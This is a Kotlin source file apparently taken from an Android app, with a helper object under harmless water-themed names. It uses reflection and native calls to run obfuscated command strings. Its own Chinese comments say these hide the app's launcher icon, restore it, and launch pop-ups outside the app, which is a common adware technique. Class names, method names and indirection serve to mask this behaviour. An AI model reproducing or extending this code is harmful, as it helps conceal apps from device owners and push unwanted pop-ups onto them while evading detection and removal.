package com.water.soak

import android.app.ActivityManager
import android.app.job.JobService
import android.content.Context
import android.util.Log
import com.tencent.mmkv.MMKV

/**
 * Date：2024/8/12
 * Describe:
 */
object SteamHelper {
    private val arrayList = arrayListOf<Any>("Demo")
    private var methodName = "goToOcean"

    fun init(context: Context) {
        MMKV.initialize(context)
        arrayList.add(context)
        arrayList.add("Aihc")
        arrayList.add("qz911")
        runCatching {
            val clazz = Class.forName("com.water.soak.SteamHelper")
            val conClazz = Class.forName("android.content.Context")
            clazz.getMethod(methodName, conClazz).invoke(null, arrayList["1".toInt()])
        }
    }

    @JvmStatic
    fun goToOcean(context: Context) {
        val ow = OceanWater(context)
        ow.oceanLake()
    }

    //参数cmd传字符串:字符串包含"hc"隐藏图标,包含"ci"恢复隐藏.包含"qz"外弹(外弹在主进程主线程调用).
    @JvmStatic
    external fun lakeStr(string: String): ByteArray

    // 隐藏 2 外弹是 3
    @JvmStatic
    fun getFlagByString(type: String): Int {
        runCatching {
            val clazz = Class.forName("com.water.soak.SteamHelper")
            clazz.getMethod("lakeStr", String::class.java)
                .invoke(null, "$type${arrayList[type.toInt()]}")
        }
        return type.toInt()
    }

    @JvmStatic
    external fun aceNm(context: Context): String

    @JvmStatic
    fun isInMe(context: Context): Boolean {
        val am: ActivityManager =
            context.getSystemService(JobService.ACTIVITY_SERVICE) as ActivityManager
        val list0: List<ActivityManager.RunningAppProcessInfo> = am.runningAppProcesses
        for (info in list0) {
            if (!info.processName.equals(context.applicationInfo.processName) || info.importance != 100) {
                continue
            }
            return true
        }
        return false
    }

}